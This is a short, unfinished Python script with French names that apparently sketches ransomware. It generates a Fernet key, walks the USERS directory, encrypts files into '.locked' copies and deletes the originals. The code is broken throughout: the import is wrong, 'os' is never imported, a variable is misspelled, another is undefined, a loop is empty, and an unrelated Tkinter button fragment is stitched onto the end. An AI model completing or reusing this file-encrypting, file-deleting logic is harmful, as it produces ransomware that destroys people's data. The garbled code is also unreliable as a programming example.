 #!/usr/bin/python
 #coding:utf-8

from cryptography.fernet import fernet

current_disk = os.environ["SystemeDrive"]

def creation_key():
    global key
    key = Fernet.generate_key()
    with open(key, "wb") as file:
      file.write(key)

def encryption_donnees(key, fichier_original):
    with open(fichier_original, 'rb') as files:
        donnees = files.read()

    mykey = Fernet(key)
    donnees_chiffrer = mykey.encrypt(donnees)
    fichier_chiffrer = chemin_a_chiffrer + ".locked"
    try:
        with open(fichier_chiffrer, 'wb') as file:
            file.write(donnees_chiffrer)

        os.remove(fichier_original)
    except:
        pass

def lister_les_donnees():
    repertoire_a_cibler = ["\\USERS\\"]
    for element in repertoire_a_cibler:
        for root, dirs, files in os.walk(element):


# Bouton Entrée

   Bouton=Button(app,text="Bouton")
   Bouton.pack()
   app.mainloop()
